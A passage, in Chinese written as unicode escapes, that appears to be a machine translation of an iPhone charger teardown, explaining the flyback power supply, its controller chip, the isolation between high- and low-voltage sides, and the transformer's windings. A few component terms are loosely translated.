\u6b21\uff0c\u4ee5\u83b7\u5f97\u6240\u9700\u7684\u51c6\u786e\u8f93\u51fa\u7535\u538b\u3002\u7531\u4e8e\u5176\u8bbe\u8ba1\uff0c\u4e0e\u7b80\u5355\u7684\u7ebf\u6027\u7535\u6e90\u76f8\u6bd4\uff0c\u5f00\u5173\u7535\u6e90\u901a\u5e38\u7d27\u51d1\u4e14\u9ad8\u6548\uff0c\u5e76\u4e14\u4ea7\u751f\u7684\u5e9f\u70ed\u5f88\u5c11\u3002\u66f4\u8be6\u7ec6\u5730\u8bf4\uff0c\u4ea4\u6d41\u7ebf\u8def\u7535\u6e90\u9996\u5148\u901a\u8fc7\u4e8c\u6781\u7ba1\u6865\u8f6c\u6362\u4e3a\u9ad8\u538b\u76f4\u6d41 [1]\u3002 DC \u7531\u7535\u6e90\u63a7\u5236\u5668 IC \u63a7\u5236\u7684\u6676\u4f53\u7ba1\u6253\u5f00\u548c\u5173\u95ed\u3002\u65a9\u6ce2\u540e\u7684\u76f4\u6d41\u7535\u9988\u5165\u53cd\u6fc0\u5f0f [2] \u53d8\u538b\u5668\uff0c\u5c06\u5176\u8f6c\u6362\u4e3a\u4f4e\u538b\u4ea4\u6d41\u7535\u3002\u6700\u540e\u5c06\u4ea4\u6d41\u7535\u8f6c\u6362\u6210\u76f4\u6d41\u7535\uff0c\u7ecf\u8fc7\u6ee4\u6ce2\u5f97\u5230\u5e73\u6ed1\u65e0\u5e72\u6270\u7684\u7535\u6e90\uff0c\u901a\u8fc7USB\u63a5\u53e3\u8f93\u51fa\u3002\u53cd\u9988\u7535\u8def\u6d4b\u91cf\u8f93\u51fa\u7535\u538b\u5e76\u5411\u63a7\u5236\u5668 IC \u53d1\u9001\u4fe1\u53f7\uff0c\u63a7\u5236\u5668 IC \u8c03\u6574\u5f00\u5173\u9891\u7387\u4ee5\u83b7\u5f97\u6240\u9700\u7535\u538b\u3002\u4e0a\u9762\u7684\u4fa7\u89c6\u56fe\u663e\u793a\u4e86\u4e00\u4e9b\u8f83\u5927\u7684\u7ec4\u4ef6\u3002\u5145\u7535\u5668\u7531\u4e24\u4e2a\u7535\u8def\u677f\u7ec4\u6210\uff0c\u6bcf\u4e2a\u7535\u8def\u677f\u7565\u4f4e\u4e8e\u4e00\u82f1\u5bf8\u89c1\u65b9\u3002 [3] \u9876\u677f\u662f\u521d\u7ea7\uff0c\u5b83\u6709\u9ad8\u538b\u7535\u8def\uff0c\u5e95\u677f\u662f\u6b21\u7ea7\uff0c\u6709\u4f4e\u538b\u8f93\u51fa\u7535\u8def\u3002\u8f93\u5165\u4ea4\u6d41\u7535\u9996\u5148\u901a\u8fc7\u4e00\u4e2a\u6613\u7194\u7535\u963b\uff08\u6761\u7eb9\uff09\uff0c\u8fd9\u4f1a\u7834\u574f\u7535\u8def\u5982\u679c\u6709\u707e\u96be\u6027\u7684\u8fc7\u8f7d\u3002\u8f93\u5165\u4ea4\u6d41\u7535\u8f6c\u6362\u4e3a\u9ad8\u538b\u76f4\u6d41\u7535\uff0c\u7531\u4e24\u4e2a\u5927\u7535\u89e3\u7535\u5bb9\uff08\u9ed1\u5e95\u767d\u5b57\u548c\u6761\u7eb9\uff09\u548c\u7535\u611f\uff08\u7eff\uff09\u5e73\u6ed1\u3002\u63a5\u4e0b\u6765\uff0c\u9ad8\u538b\u76f4\u6d41\u88ab\u4e00\u4e2a MOSFET \u5f00\u5173\u6676\u4f53\u7ba1\u4ee5\u9ad8\u9891\u65a9\u6ce2\uff0c\u8fd9\u662f\u5de6\u4e0a\u89d2\u7684\u5927\u578b\u4e09\u5f15\u811a\u7ec4\u4ef6\u3002 \uff08\u7b2c\u4e8c\u4e2a\u6676\u4f53\u7ba1\u94b3\u4f4d\u7535\u538b\u5c16\u5cf0\uff0c\u5982\u4e0b\u6587\u6240\u8ff0\u3002\uff09\u65a9\u6ce2\u7684 DC \u8fdb\u5165\u53cd\u6fc0\u53d8\u538b\u5668\uff08\u9ec4\u8272\uff0c\u6676\u4f53\u7ba1\u540e\u9762\u51e0\u4e4e\u4e0d\u53ef\u89c1\uff09\uff0c\u8be5\u53d8\u538b\u5668\u5177\u6709\u901a\u5f80\u4e0b\u65b9\u6b21\u7ea7\u677f\u7684\u4f4e\u538b\u8f93\u51fa\u7ebf\u3002 \uff08\u8fd9\u4e9b\u7535\u7ebf\u5728\u62c6\u5378\u8fc7\u7a0b\u4e2d\u88ab\u5207\u65ad\u3002\uff09\u6b21\u7ea7\u677f\u5c06\u6765\u81ea\u53d8\u538b\u5668\u7684\u4f4e\u7535\u538b\u8f6c\u6362\u4e3a\u76f4\u6d41\uff0c\u5bf9\u5176\u8fdb\u884c\u6ee4\u6ce2\uff0c\u7136\u540e\u901a\u8fc7 USB \u8fde\u63a5\u5668\uff08\u5de6\u4e0b\u65b9\u7684\u94f6\u8272\u77e9\u5f62\uff09\u5c06\u5176\u9988\u51fa\u3002\u7070\u8272\u5e26\u72b6\u7535\u7f06\uff08\u5728\u7535\u5bb9\u5668\u4e0b\u65b9\u7684\u53f3\u4e0b\u65b9\u51e0\u4e4e\u770b\u4e0d\u89c1\uff09\u63d0\u4f9b\u4ece\u6b21\u7ea7\u677f\u5230\u63a7\u5236\u5668 IC \u7684\u53cd\u9988\uff0c\u4ee5\u4fdd\u6301\u7535\u538b\u7a33\u5b9a\u3002\u4e0a\u56fe\u66f4\u6e05\u695a\u5730\u663e\u793a\u4e86\u53cd\u6fc0\u53d8\u538b\u5668\uff08\u9ec4\u8272\uff09\uff0c\u4f4d\u4e8e USB \u63d2\u5b54\u4e0a\u65b9\u3002\u84dd\u8272\u7684\u5927\u5143\u4ef6\u662f\u4e00\u4e2a\u7279\u6b8a\u7684\u201cY\u201d\u7535\u5bb9[4]\uff0c\u7528\u4e8e\u51cf\u5c11\u5e72\u6270\u3002\u63a7\u5236\u5668IC\u5728\u4e3b\u677f\u9876\u90e8\u7684\u53d8\u538b\u5668\u4e0a\u65b9\u53ef\u89c1\u3002 [5] \u4e3b\u7535\u8def\u677f\u4e24\u9762\u90fd\u88c5\u6709\u8868\u9762\u8d34\u88c5\u5143\u4ef6\u3002\u5185\u4fa7\uff08\u4e0a\u56fe\uff09\u88c5\u6709\u5927\u578b\u5143\u4ef6\uff0c\u800c\u5916\u4fa7\uff08\u4e0b\u56fe\uff09\u88c5\u6709\u63a7\u5236\u5668 IC\u3002 \uff08\u56fe\u4e2d\u53bb\u6389\u4e86\u5927\u5143\u4ef6\uff0c\u7528\u659c\u4f53\u8868\u793a\u3002\uff09\u8f93\u5165\u7535\u6e90\u63a5\u677f\u89d2\uff0c\u901a\u8fc710\u03a9\u53ef\u7194\u7535\u963b\uff0c\u7531\u56db\u4e2a\u4e8c\u6781\u7ba1\u6574\u6d41\u6210\u76f4\u6d41\u3002\u4e24\u4e2aRC\u7f13\u51b2\u7535\u8def\u5438\u6536\u7535\u6865\u4ea7\u751f\u7684 EMI \u5e72\u6270\u3002 [6]\u76f4\u6d41\u7ecf\u4e24\u4e2a\u5927\u7535\u89e3\u7535\u5bb9\u548c\u7535\u611f\u6ee4\u6ce2\uff0c\u4ea7\u751f125-340V\u76f4\u6d41\u3002\u8bf7\u6ce8\u610f\uff0c\u4e0e\u8f83\u7ec6\u7684\u63a7\u5236\u8d70\u7ebf\u76f8\u6bd4\uff0c\u8fde\u63a5\u8fd9\u4e9b\u7535\u5bb9\u5668\u548c\u5176\u4ed6\u9ad8\u7535\u6d41\u7ec4\u4ef6\u7684\u7535\u8def\u677f\u8d70\u7ebf\u7684\u539a\u5ea6\u3002\u7535\u6e90\u7531 8 \u5f15\u811a STMicrosystems L6565 \u51c6\u8c10\u632f SMPS \u63a7\u5236\u5668\u82af\u7247\u63a7\u5236\u3002 [7] \u63a7\u5236\u5668 IC \u9a71\u52a8 MOSFET \u5f00\u5173\u6676\u4f53\u7ba1\uff0c\u8be5\u6676\u4f53\u7ba1\u5bf9\u9ad8\u538b\u76f4\u6d41\u8fdb\u884c\u65a9\u6ce2\u5e76\u5c06\u5176\u9988\u5165\u53cd\u6fc0\u53d8\u538b\u5668\u7684\u521d\u7ea7\u7ed5\u7ec4\u3002\u63a7\u5236\u5668 IC \u63a5\u53d7\u591a\u79cd\u8f93\u5165\uff08\u6b21\u7ea7\u7535\u538b\u53cd\u9988\u3001\u8f93\u5165\u76f4\u6d41\u7535\u538b\u3001\u53d8\u538b\u5668\u521d\u7ea7\u7535\u6d41\u3001\u548c\u53d8\u538b\u5668\u9000\u78c1\u611f\u5e94\uff09\u5e76\u8c03\u6574\u5f00\u5173\u9891\u7387\u548c\u65f6\u5e8f\u4ee5\u901a\u8fc7\u590d\u6742\u7684\u5185\u90e8\u7535\u8def\u63a7\u5236\u8f93\u51fa\u7535\u538b\u3002\u7535\u6d41\u611f\u5e94\u7535\u963b\u5668\u8ba9 IC \u77e5\u9053\u6709\u591a\u5c11\u7535\u6d41\u6d41\u8fc7\u521d\u7ea7\uff0c\u4ece\u800c\u63a7\u5236\u4f55\u65f6\u5e94\u8be5\u5173\u95ed\u6676\u4f53\u7ba1\u3002\u7b2c\u4e8c\u4e2a\u5f00\u5173\u6676\u4f53\u7ba1\u4ee5\u53ca\u4e00\u4e9b\u7535\u5bb9\u5668\u548c\u4e8c\u6781\u7ba1\u662f\u8c10\u632f\u94b3\u4f4d\u7535\u8def\u7684\u4e00\u90e8\u5206\uff0c\u7528\u4e8e\u5438\u6536\u53d8\u538b\u5668\u4e0a\u7684\u7535\u538b\u5c16\u5cf0\u3002\u8fd9\u79cd\u4e0d\u540c\u5bfb\u5e38\u7684\u521b\u65b0\u7535\u8def\u5df2\u83b7\u5f97 Flextronics \u7684\u4e13\u5229\u3002 [8] [9] \u63a7\u5236\u5668IC\u9700\u8981\u76f4\u6d41\u7535\u6e90\u624d\u80fd\u8fd0\u884c\uff1b\u8fd9\u662f\u7531\u8f85\u52a9\u7535\u6e90\u7535\u8def\u63d0\u4f9b\u7684\uff0c\u8be5\u7535\u8def\u7531\u53d8\u538b\u5668\u4e0a\u7684\u72ec\u7acb\u8f85\u52a9\u7ed5\u7ec4\u3001\u4e8c\u6781\u7ba1\u548c\u6ee4\u6ce2\u7535\u5bb9\u5668\u7ec4\u6210\u3002\u7531\u4e8e\u63a7\u5236\u5668 IC \u9700\u8981\u5728\u53d8\u538b\u5668\u5f00\u59cb\u53d1\u7535\u4e4b\u524d\u901a\u7535\uff0c\u60a8\u53ef\u80fd\u60f3\u77e5\u9053\u5982\u4f55\u89e3\u51b3\u8fd9\u4e2a\u5148\u6709\u9e21\u8fd8\u662f\u5148\u6709\u86cb\u7684\u95ee\u9898\u3002\u89e3\u51b3\u65b9\u6cd5\u662f\u901a\u8fc7\u542f\u52a8\u529f\u7387\u7535\u963b\u5c06\u9ad8\u538b\u76f4\u6d41\u964d\u81f3\u4f4e\u7535\u5e73\uff0c\u4e3aIC\u63d0\u4f9b\u521d\u59cb\u7535\u6e90\uff0c\u76f4\u5230\u53d8\u538b\u5668\u542f\u52a8\u3002\u8f85\u52a9\u7ed5\u7ec4\u4e5f\u88ab IC \u7528\u6765\u68c0\u6d4b\u53d8\u538b\u5668\u9000\u78c1\uff0c\u6307\u793a\u4f55\u65f6\u5f00\u542f\u5f00\u5173\u6676\u4f53\u7ba1\u3002 [7] \u5728\u6b21\u7ea7\u677f\u4e0a\uff0c\u6765\u81ea\u53d8\u538b\u5668\u7684\u4f4e\u538b\u4ea4\u6d41\u7535\u7ecf\u9ad8\u901f\u8096\u7279\u57fa\u4e8c\u6781\u7ba1\u6574\u6d41\uff0c\u7ecf\u7535\u611f\u548c\u7535\u5bb9\u6ee4\u6ce2\u540e\uff0c\u8fde\u63a5\u5230USB\u8f93\u51fa\u7aef\u3002\u94bd\u6ee4\u6ce2\u7535\u5bb9\u5668\u5728\u5c0f\u5c01\u88c5\u4e2d\u63d0\u4f9b\u9ad8\u7535\u5bb9\u3002 USB \u8f93\u51fa\u8fd8\u5177\u6709\u8fde\u63a5\u5230\u6570\u636e\u5f15\u811a\u7684\u7279\u5b9a\u7535\u963b\uff0c\u4ee5\u901a\u8fc7\u4e13\u6709\u7684 Apple \u534f\u8bae\u5411 iPhone \u6307\u793a\u5145\u7535\u5668\u53ef\u4ee5\u63d0\u4f9b\u591a\u5c11\u7535\u6d41\u3002 [10] \u5982\u679c\u5145\u7535\u5668\u5728\u6b64\u5904\u5177\u6709\u9519\u8bef\u7684\u7535\u963b\uff0ciPhone \u4f1a\u663e\u793a\u6d88\u606f\u201c\u6b64\u914d\u4ef6\u4e0d\u652f\u6301\u5145\u7535\u201d\u3002\u6b21\u7ea7\u677f\u5305\u542b\u4e00\u4e2a\u6807\u51c6\u7684\u5f00\u5173\u7535\u6e90\u53cd\u9988\u7535\u8def\uff0c\u5b83\u7528\u4e00\u4e2a TL431 \u7a33\u538b\u5668\u76d1\u63a7\u8f93\u51fa\u7535\u538b\uff0c\u5e76\u901a\u8fc7\u5149\u8026\u5408\u5668\u5411\u63a7\u5236\u5668 IC \u63d0\u4f9b\u53cd\u9988\u3002\u5982\u679c\u5145\u7535\u5668\u8fc7\u70ed\u6216\u8f93\u51fa\u7535\u538b\u8fc7\u9ad8\uff0c\u7b2c\u4e8c\u4e2a\u53cd\u9988\u7535\u8def\u4f1a\u5173\u95ed\u5145\u7535\u5668\u4ee5\u8fdb\u884c\u4fdd\u62a4\u3002 [11] \u5e26\u72b6\u7535\u7f06\u5411\u4e3b\u677f\u63d0\u4f9b\u6b64\u53cd\u9988\u3002\u7531\u4e8e\u7535\u6e90\u5185\u90e8\u6700\u9ad8\u53ef\u8fbe 340V DC\uff0c\u56e0\u6b64\u5b89\u5168\u6027\u662f\u4e00\u4e2a\u91cd\u8981\u95ee\u9898\u3002\u4e25\u683c\u7684\u89c4\u5b9a\u7ba1\u7406\u5371\u9669\u7ebf\u8def\u7535\u538b\u548c\u5b89\u5168\u8f93\u51fa\u7535\u538b\u4e4b\u95f4\u7684\u9694\u79bb\uff0c\u5b83\u4eec\u901a\u8fc7\u8ddd\u79bb\uff08\u79f0\u4e3a\u722c\u7535\u8ddd\u79bb\u548c\u7535\u6c14\u95f4\u9699\uff09\u548c\u7edd\u7f18\u7684\u7ec4\u5408\u8fdb\u884c\u9694\u79bb\u3002\u6807\u51c6 [12] \u6709\u70b9\u96be\u4ee5\u7406\u89e3\uff0c\u4f46\u4e24\u4e2a\u7535\u8def\u4e4b\u95f4\u9700\u8981\u5927\u7ea6 4mm \u7684\u8ddd\u79bb\u3002 \uff08\u6b63\u5982\u6211\u5728 Tiny\u3001\u4fbf\u5b9c\u3001\u5371\u9669\uff1a\u5728\uff08\u5047\uff09iPhone \u5145\u7535\u5668\u4e2d\u8ba8\u8bba\u7684\u90a3\u6837\uff0c\u4fbf\u5b9c\u7684\u5145\u7535\u5668\u5b8c\u5168\u65e0\u89c6\u8fd9\u4e9b\u5b89\u5168\u89c4\u5219\u3002\uff09\u60a8\u53ef\u80fd\u5e0c\u671b\u4e3b\u677f\u5177\u6709\u5371\u9669\u7535\u538b\uff0c\u800c\u6b21\u7ea7\u677f\u5177\u6709\u5b89\u5168\u7535\u538b\uff0c\u4f46\u662f\u4e8c\u6b21\u677f\u7531\u4e24\u4e2a\u533a\u57df\u7ec4\u6210\uff1a\u4e0e\u4e3b\u677f\u76f8\u8fde\u7684\u5371\u9669\u533a\u57df\u548c\u4f4e\u538b\u533a\u57df\u3002\u8fd9\u4e9b\u533a\u57df\u4e4b\u95f4\u7684\u9694\u79bb\u8fb9\u754c\u5728 Apple \u5145\u7535\u5668\u4e2d\u7ea6\u4e3a 6mm\uff0c\u53ef\u4ee5\u5728\u4e0a\u56fe\u4e2d\u770b\u5230\u3002\u6b64\u9694\u79bb\u8fb9\u754c\u53ef\u786e\u4fdd\u5371\u9669\u7535\u538b\u65e0\u6cd5\u5230\u8fbe\u8f93\u51fa\u3002\u8de8\u8d8a\u9694\u79bb\u8fb9\u754c\u7684\u7ec4\u4ef6\u6709\u4e09\u7c7b\uff0c\u5b83\u4eec\u5fc5\u987b\u7ecf\u8fc7\u4e13\u95e8\u8bbe\u8ba1\u4ee5\u786e\u4fdd\u5b89\u5168\u3002\u5173\u952e\u90e8\u4ef6\u662f\u53d8\u538b\u5668\uff0c\u5b83\u63d0\u4f9b\u4e86\u4e00\u79cd\u65e0\u9700\u76f4\u63a5\u7535\u6c14\u8fde\u63a5\u5373\u53ef\u4f7f\u7535\u529b\u5230\u8fbe\u8f93\u51fa\u7684\u65b9\u5f0f\u3002\u5728\u5185\u90e8\uff0c\u53d8\u538b\u5668\u662f\u5e7f\u6cdb\u7edd\u7f18\u7684\uff0c\u5982\u4e0b\u6240\u793a\u3002\u7b2c\u4e8c\u79cd\u7ec4\u4ef6\u7c7b\u578b\u662f\u5149\u8026\u5408\u5668\uff0c\u5b83\u5c06\u53cd\u9988\u4fe1\u53f7\u4ece\u6b21\u7ea7\u53d1\u9001\u5230\u521d\u7ea7\u3002\u5728\u5185\u90e8\uff0c\u5149\u8026\u5408\u5668\u5305\u542b\u4e00\u4e2a LED \u548c\u4e00\u4e2a\u5149\u7535\u6676\u4f53\u7ba1\uff0c\u56e0\u6b64\u4e24\u4fa7\u4ec5\u901a\u8fc7\u5149\u8fde\u63a5\uff0c\u800c\u4e0d\u662f\u901a\u8fc7\u7535\u8def\u8fde\u63a5\u3002 \uff08\u6ce8\u610f\u5149\u8026\u5408\u5668\u6b21\u7ea7\u4fa7\u7684\u7845\u7edd\u7f18\u4ee5\u63d0\u4f9b\u989d\u5916\u7684\u5b89\u5168\u6027\u3002\uff09\u6700\u540e\uff0cY \u7535\u5bb9\u5668\u662f\u4e00\u79cd\u7279\u6b8a\u7c7b\u578b\u7684\u7535\u5bb9\u5668 [4]\uff0c\u53ef\u8ba9 EMI\uff08\u7535\u78c1\u5e72\u6270\uff09\u5728\u9ad8\u538b\u521d\u7ea7\u548c\u4f4e\u538b\u521d\u7ea7\u4e4b\u95f4\u9038\u51fa\u3002\u4e8c\u6b21\u7535\u538b\u3002\u4e0a\u56fe\u663e\u793a\u4e86\u4e00\u4e9b\u9694\u79bb\u6280\u672f\u3002\u6b21\u7ea7\u677f\uff08\u5de6\uff09\u6709\u84dd\u8272 Y \u7535\u5bb9\u5668\u3002\u6ce8\u610f\u6b21\u7ea7\u677f\u4e2d\u95f4\u7f3a\u5c11\u5143\u4ef6\uff0c\u5f62\u6210\u9694\u79bb\u8fb9\u754c\u3002\u6b21\u7ea7\u7535\u8def\u677f\u53f3\u4fa7\u7684\u7ec4\u4ef6\u901a\u8fc7\u7070\u8272\u5e26\u72b6\u7535\u7f06\u8fde\u63a5\u5230\u521d\u7ea7\u7535\u8def\u677f\uff0c\u56e0\u6b64\u5b83\u4eec\u53ef\u80fd\u5904\u4e8e\u9ad8\u538b\u72b6\u6001\u3002\u7535\u8def\u677f\u4e4b\u95f4\u7684\u53e6\u4e00\u4e2a\u8fde\u63a5\u662f\u6765\u81ea\u53cd\u6fc0\u5f0f\u53d8\u538b\u5668\uff08\u9ec4\u8272\uff09\u7684\u4e00\u5bf9\u7535\u7ebf\uff0c\u7528\u4e8e\u63d0\u4f9b\u8f93\u51fa\u529f\u7387\u5230\u4e8c\u7ea7\u59d4\u5458\u4f1a\uff1b\u8fd9\u4e9b\u88ab\u5207\u5272\u4ee5\u5206\u79bb\u677f\u3002\u6211\u5df2\u7ecf\u6574\u7406\u4e86\u4e00\u4e2a\u663e\u793a\u5145\u7535\u5668\u7535\u8def\u7684\u8fd1\u4f3c\u793a\u610f\u56fe\u3002 [13] \u70b9\u51fb\u67e5\u770b\u5927\u56fe\u3002\u770b\u7740\u8fd9\u4e9b\u56fe\u7247\uff0c\u5f88\u5bb9\u6613\u5fd8\u8bb0\u8fd9\u4e9b\u7ec4\u4ef6\u6709\u591a\u5c0f\uff0c\u4ee5\u53ca\u5145\u7535\u5668\u5982\u4f55\u5c06\u6240\u6709\u8fd9\u4e9b\u590d\u6742\u6027\u585e\u8fdb\u4e00\u82f1\u5bf8\u3002\u4e0b\u9762\u7a0d\u5fae\u653e\u5927\u7684\u56fe\u7247\u663e\u793a\u4e86\u4e00\u4e2a\u56db\u5206\u4e4b\u4e00\u3001\u4e00\u7c92\u7c73\u548c\u4e00\u4e2a\u82a5\u83dc\u7c7d\uff0c\u4ee5\u8fdb\u884c\u5c3a\u5bf8\u6bd4\u8f83\u3002\u5927\u591a\u6570\u7ec4\u4ef6\u662f\u76f4\u63a5\u710a\u63a5\u5230\u5370\u5237\u7535\u8def\u677f\u4e0a\u7684\u8868\u9762\u8d34\u88c5\u5668\u4ef6\u3002\u6700\u5c0f\u7684\u5143\u4ef6\uff0c\u4f8b\u5982\u56fe\u4e2d\u6307\u51fa\u7684\u7535\u963b\u5668\uff0c\u88ab\u79f0\u4e3a\u201c0402\u201d\u5c3a\u5bf8\uff0c\u56e0\u4e3a\u5b83\u4eec\u662f 0.04 \u82f1\u5bf8 x 0.02 \u82f1\u5bf8\u3002\u82a5\u83dc\u7c7d\u5de6\u4fa7\u7684\u8f83\u5927\u7535\u963b\u5668\u53ef\u5904\u7406\u66f4\u591a\u529f\u7387\uff0c\u5e76\u4e14\u88ab\u79f0\u4e3a\u201c0805\u201d\u5c3a\u5bf8\uff0c\u56e0\u4e3a\u5b83\u4eec\u7684\u5c3a\u5bf8\u4e3a 0.08 x .05 \u82f1\u5bf8\u3002\u53cd\u6fc0\u53d8\u538b\u5668\u662f\u5145\u7535\u5668\u7684\u5173\u952e\u90e8\u4ef6\uff0c\u662f\u6700\u5927\u7684\u90e8\u4ef6\uff0c\u4e5f\u53ef\u80fd\u662f\u6700\u8d35\u7684\u3002 [14] \u4f46\u91cc\u9762\u662f\u4ec0\u4e48\uff1f\u6211\u62c6\u5f00\u53d8\u538b\u5668\u627e\u51fa\u7b54\u6848\u3002\u53d8\u538b\u5668\u7684\u5c3a\u5bf8\u5927\u7ea6\u4e3a 1/2&quot; x 1/2&quot; x 1/3&quot;\u3002\u5728\u5185\u90e8\uff0c\u53d8\u538b\u5668\u5177\u6709\u4e09\u4e2a\u7ed5\u7ec4\uff1a\u9ad8\u538b\u521d\u7ea7\u8f93\u5165\u7ed5\u7ec4\u3001\u4e3a\u63a7\u5236\u7535\u8def\u63d0\u4f9b\u7535\u6e90\u7684\u4f4e\u538b\u8f85\u52a9\u7ed5\u7ec4\u548c\u9ad8\u538b-\u7535\u6d41\u4f4e\u538b\u8f93\u51fa\u7ed5\u7ec4\uff0c\u8f93\u51fa\u7ed5\u7ec4\u63a5\u53d8\u538b\u5668\u7684\u9ed1\u7ebf\u548c\u767d\u7ebf\uff0c\u5176\u4ed6\u7ed5\u7ec4\u63a5\u53d8\u538b\u5668\u5e95\u90e8\u7684\u7ba1\u811a\uff0c\u53d8\u538b\u5668\u5916\u9762\u6709\u4e24\u5c42\u7edd\u7f18\u80f6\u5e26\u3002\u7b2c\u4e8c\u884c\u4f3c\u4e4e\u4ee5\u201cFLEX\u201d\u5f00\u5934\uff0c\u5bf9\u4e8e\u4f1f\u521b\u529b\u3002\u4e24\u80a1\u63a5\u5730\u7ebf\u7f20\u7ed5\u5728\u53d8\u538b\u5668\u5916\u90e8\u4ee5\u63d0\u4f9b\u5c4f\u853d\u3002\u53bb\u9664\u5c4f\u853d\u548c\u80f6\u5e26\u540e\uff0c\u94c1\u6c27\u4f53\u78c1\u82af\u7684\u4e24\u534a\u53ef\u4ee5\u4ece\u7ed5\u7ec4\u4e2d\u79fb\u9664\u3002\u94c1\u6c27\u4f53\u662f\u4e00\u79cd\u76f8\u5f53\u8106\u7684\u9676\u74f7\u6750\u6599\uff0c\u56e0\u6b64\u5728\u79fb\u9664\u8fc7\u7a0b\u4e2d\u78c1\u82af\u7834\u88c2\u3002\u78c1\u82af\u56f4\u7ed5\u7ed5\u7ec4\u5e76\u5305\u542b\u78c1\u573a\u3002\u6bcf\u4e2a\u78c1\u82af\u5757\u5927\u7ea6\u4e3a 6mm x 11mm x 4mm\uff1b\u8fd9\u79cd\u7c7b\u578b\u7684\u78c1\u82af\u88ab\u79f0\u4e3a\u60c5\u5546\u3002\u5706\u5f62\u4e2d\u5fc3\u90e8\u5206\u6bd4\u4e24\u7aef\u7565\u77ed\uff0c\u5f53\u82af\u7247\u653e\u5728\u4e00\u8d77\u65f6\u4f1a\u4ea7\u751f\u4e00\u4e2a\u5c0f\u7684\u6c14\u9699\u3002\u8fd9\u4e2a 0.28 \u6beb\u7c73\u7684\u6c14\u9699\u5b58\u50a8\u4e86\u53cd\u6fc0\u53d8\u538b\u5668\u7684\u78c1\u80fd\u3002\u5728\u63a5\u4e0b\u6765\u7684\u4e24\u5c42\u80f6\u5e26\u4e0b\u9762\u662f\u4e00\u4e2a 17 \u531d\u7684\u7ec6\u6f06\u7ebf\u7ed5\u7ec4\uff0c\u6211\u8ba4\u4e3a\u8fd9\u662f\u53e6\u4e00\u4e2a\u5c4f\u853d\u7ed5\u7ec4\uff0c\u53ef\u4ee5\u5c06\u6742\u6563\u5e72\u6270\u8fd4\u56de\u5230\u5730\u9762\u3002\u5728\u5c4f\u853d\u5c42\u548c\u53e6\u5916\u4e24\u5c42\u80f6\u5e26\u4e0b\u9762\u662f\u8fde\u63a5\u5230\u9ed1\u767d\u7ebf\u7684 6 \u531d\u6b21\u7ea7\u8f93\u51fa\u7ed5\u7ec4\u3002\u8bf7\u6ce8\u610f\uff0c\u8be5\u7ed5\u7ec4\u662f\u7c97\u7ebf\uff0c\u56e0\u4e3a\u5b83\u4e3a 1A \u8f93\u51fa\u4f9b\u7535\u3002\u53e6\u8bf7\u6ce8\u610f\uff0c\u7ed5\u7ec4\u662f\u4e09\u91cd\u7edd\u7f18\u7684\uff0c\u8fd9\u662f UL \u5b89\u5168\u8981\u6c42\uff0c\u4ee5\u786e\u4fdd\u9ad8\u538b\u521d\u7ea7\u4e0e\u8f93\u51fa\u4fdd\u6301\u9694\u79bb\u3002\u8fd9\u662f\u5ec9\u4ef7\u5145\u7535\u5668\u4f5c\u5f0a\u7684\u4e00\u4e2a\u5730\u65b9\u2014\u2014\u5b83\u4eec\u53ea\u662f\u4f7f\u7528\u666e\u901a\u7535\u7ebf\u800c\u4e0d\u662f\u4e09\u91cd\u7edd\u7f18\u7684\u7535\u7ebf\uff0c\u800c\u4e14\u8fd8\u5728\u80f6\u5e26\u4e0a\u541d\u556c\u3002\u7ed3\u679c\u662f\uff0c\u5982\u679c\u5b58\u5728\u7edd\u7f18\u7f3a\u9677\u6216\u7535\u6d8c\uff0c\u5219\u65e0\u6cd5\u4fdd\u62a4\u60a8\u514d\u53d7\u9ad8\u538b\u5f71\u54cd\u3002\u5728\u4e0b\u4e00\u4e2a\u53cc\u5c42\u80f6\u5e26\u4e0b\u662f 11 \u531d\u5927\u89c4\u683c\u521d\u7ea7\u7535\u6e90\u7ed5\u7ec4\uff0c\u5b83\u4e3a\u63a7\u5236\u5668 IC \u4f9b\u7535\u3002\u7531\u4e8e\u8be5\u7ed5\u7ec4\u4f4d\u4e8e\u521d\u7ea7\u4fa7\uff0c\u56e0\u6b64\u4e0d\u9700\u8981\u8fdb\u884c\u4e09\u91cd\u7edd\u7f18\u3002\u5b83\u53ea\u662f\u7528\u4e00\u5c42\u8584\u8584\u7684\u6e05\u6f06\u7edd\u7f18\u3002\u5728\u6700\u540e\u7684\u53cc\u5c42\u80f6\u5e26\u4e0b\u9762\u662f\u521d\u7ea7\u8f93\u5165\u7ed5\u7ec4\uff0c\u5b83\u662f 4 \u5c42\uff0c\u6bcf\u5c42\u5927\u7ea6 23 \u531d\u3002\u8be5\u7ed5\u7ec4\u63a5\u6536\u9ad8\u538b\u8f93\u5165\u3002\u7531\u4e8e\u7535\u6d41\u975e\u5e38\u4f4e\uff0c\u5bfc\u7ebf\u53ef\u4ee5\u975e\u5e38\u7ec6\u3002\u56e0\u4e3a\u521d\u7ea7\u7ed5\u7ec4\u7684\u531d\u6570\u5927\u7ea6\u662f\u6b21\u7ea7\u7ed5\u7ec4\u7684 15 \u500d\uff0c\u6240\u4ee5\u6b21\u7ea7\u7535\u538b\u5c06\u662f\u521d\u7ea7\u7535\u538b\u7684 1/15\uff0c\u4f46\u662f\u7535\u6d41\u7684 15 \u500d\u3002\u56e0\u6b64\uff0c\u53d8\u538b\u5668\u5c06\u9ad8\u538b\u8f93\u5165\u8f6c\u6362\u4e3a\u4f4e\u538b\u3001\u5927\u7535\u6d41\u8f93\u51fa\u3002\u6700\u540e\u4e00\u5f20\u56fe\u663e\u793a\u4e86\u53d8\u538b\u5668\u7684\u6240\u6709\u7ec4\u4ef6\uff1b\u4ece\u5de6\u5230\u53f3\u663e\u793a\u4e86\u4ece\u5916\u4fa7\u80f6\u5e26\u5230\u6700\u5185\u4fa7\u7ed5\u7ec4\u548c\u7ebf\u8f74\u7684\u5c42\u6570\u3002\u6211\u5f88\u60ca\u8bb6\u5730\u610f\u8bc6\u5230\u82f9\u679c\u5728\u8fd9\u4e9b\u5145\u7535\u5668\u4e0a\u7684\u5229\u6da6\u7387\u4e00\u5b9a\u662f\u5de8\u5927\u7684\u3002\u8fd9\u4e9b\u5145\u7535\u5668\u7684\u552e\u4ef7\u7ea6\u4e3a 30 \u7f8e\u5143\uff08\u5982\u679c\u4e0d\u662f\u5047\u5192\u4ea7\u54c1\uff09\uff0c\u4f46\u8fd9\u51e0\u4e4e\u662f\u6240\u6709\u5229\u6da6\u3002\u4e09\u661f\u4ee5\u5927\u7ea6 6 \u5230 10 